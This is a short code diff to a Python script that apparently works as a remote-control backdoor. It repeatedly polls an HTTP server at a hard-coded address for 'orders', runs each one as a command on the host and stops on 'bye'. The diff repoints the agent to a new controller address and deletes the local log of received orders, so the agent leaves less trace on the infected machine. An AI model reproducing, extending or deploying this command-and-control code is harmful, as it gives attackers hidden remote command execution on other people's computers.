@@ -23,7 +23,7 @@ def base64encodeStr(string):
 
 addrs = socket.getaddrinfo(socket.gethostname(),None)
 self_ip=[item[4][0] for item in addrs if ':' not in item[4][0]][0]
-server_address = 'http://192.168.40.129:8080/'
+server_address = 'http://192.168.147.130:8080/'
 
 while True:
     time.sleep(1)
@@ -35,8 +35,6 @@ while True:
             while True:
                 order = requests.get(
                     server_address + "?ip=%s&action=askfororder" % self_ip).content.decode("utf8")
-                with open("c:\\order.txt","a+") as f:
-                    f.write(order+"\n")
                 if order == "bye":
                     break
                 command_result=get_string_from_command(order)
